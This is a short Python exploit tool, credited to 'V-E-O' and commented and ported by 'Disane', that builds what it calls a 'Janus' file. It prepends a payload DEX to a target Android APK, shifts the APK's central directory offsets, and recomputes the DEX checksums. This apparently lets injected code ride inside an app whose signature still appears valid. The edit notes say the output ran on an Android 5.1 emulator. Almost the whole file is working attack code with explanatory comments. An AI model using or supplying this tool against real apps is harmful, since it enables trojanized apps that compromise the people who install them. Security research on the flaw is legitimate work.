#!/usr/bin/python

import sys
import struct
import hashlib
from zlib import adler32

__author__ = 'V-E-O'
__github__ = 'https://github.com/V-E-O'


'''
Edited by Disane @ https://github.com/Disane
+ Added commentary
+ Ported code to execute on Python 3.6.1+:
    + memoryview used to calculate adler32 checksum
    + end of central directory magic bytes are now passed to rfind() as bytes
    instead of strings
+ Tested resulting APK on emulator AOSP Android OS ver. 5.1 x86-64
  and it works!
'''


def update_checksum(data):
    # acquire SHA1 algo
    m = hashlib.sha1()
    m.update(data[32:])
    # patch SHA1 inside prepended DEX
    data[12:12+20] = m.digest()

    # pass everything (except for the DEX header and Adler32 section) 
    # of the payload DEX to the Adler32 checksum algo
    # mask to cut down anything past 32 bits
    v = adler32(memoryview(data[12:])) & 0xffffffff
    # convert Adler32 result to little endian 
    # and write it back into the payload
    data[8:12] = struct.pack("<L", v)


def main():
    if len(sys.argv) != 4:
        print("usage: %s dex apk out_apk" % __file__)
        return

    _, dex, apk, out_apk = sys.argv

    with open(dex, 'rb') as f:
        # read payload DEX as a ByteArray
        dex_data = bytearray(f.read())
    # measure payload DEX content size
    dex_size = len(dex_data)

    with open(apk, 'rb') as f:
        # read terget APK as a ByteArray
        apk_data = bytearray(f.read())
    # find index to End of Central Directory -> PK\x05\x06
    cd_end_addr = apk_data.rfind(b'\x50\x4b\x05\x06')
    # unpack little endian aligned data 
    # and look for central directory size in the end of directory
    cd_start_addr = struct.unpack("<L", apk_data[cd_end_addr+16:cd_end_addr+20])[0]
    # update the size of the central directory area 
    # inside the end of central directory by adding the size of the payload DEX
    apk_data[cd_end_addr+16:cd_end_addr+20] = struct.pack("<L", cd_start_addr + dex_size)

    # find central directory start address 
    pos = cd_start_addr
    # write new central directory entry
    while (pos < cd_end_addr):
        # acquire relative offset
        offset = struct.unpack("<L", apk_data[pos+42:pos+46])[0]
        # overwrite relative offset and update it using the payload DEX size
        apk_data[pos+42:pos+46] = struct.pack("<L", offset+dex_size)
        # find end of central dir signature: PK\x05\x06
        pos = apk_data.find(b'\x50\x4b\x01\x02', pos+46, cd_end_addr)
        # if this there's no end of central dir signature entry
        # stop patching
        if pos == -1:
            break

    # the payload is added as a new central directory entry 
    # which will have the payload DEX content in front
    # while the contents of the APK are written after the payload DEX contents 
    out_data = dex_data + apk_data
    # acquire SHA1 hash of the DEX file
    out_data[32:36] = struct.pack("<L", len(out_data))
    # update DEX SHA1 checksum
    update_checksum(out_data)

    # write the new DEX/APK Janus file
    with open(out_apk, "wb") as f:
        f.write(out_data)

    print('%s generated' % out_apk)


if __name__ == '__main__':
    main()
